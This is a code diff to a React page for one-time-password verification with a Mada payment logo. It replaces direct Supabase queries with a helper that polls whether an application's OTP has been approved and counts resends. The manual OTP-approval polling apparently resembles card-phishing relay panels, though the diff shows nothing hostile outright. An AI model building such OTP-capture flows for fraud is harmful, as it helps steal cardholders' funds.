@@ -9,6 +9,7 @@ import { Footer } from "@/components/Footer";
 import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
 import { supabase } from "@/integrations/supabase/client";
+import { getApplicationStatus } from "@/lib/applicationPublic";
 import { usePresence } from "@/hooks/usePresence";
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import madaLogo from "@/assets/mada-logo.png";
@@ -88,12 +89,8 @@ const OTPVerification = () => {
     if (waitingForApproval && applicationId) {
       // Check for approval every 2 seconds
       const interval = setInterval(async () => {
-        const { data, error } = await supabase
-          .from('customer_applications')
-          .select('otp_approved, status')
-          .eq('id', applicationId)
-          .single();
-          
+        const { data, error } = await getApplicationStatus(applicationId);
+
         if (data?.otp_approved) {
           clearInterval(interval);
           setWaitingForApproval(false);
@@ -145,11 +142,7 @@ const OTPVerification = () => {
     
     // تسجيل إعادة إرسال الرمز في قاعدة البيانات
     if (applicationId) {
-      supabase
-        .from('customer_applications')
-        .select('otp_resend_count')
-        .eq('id', applicationId)
-        .single()
+      getApplicationStatus(applicationId)
         .then(({ data }) => {
           const currentCount = (data as any)?.otp_resend_count || 0;
           supabase
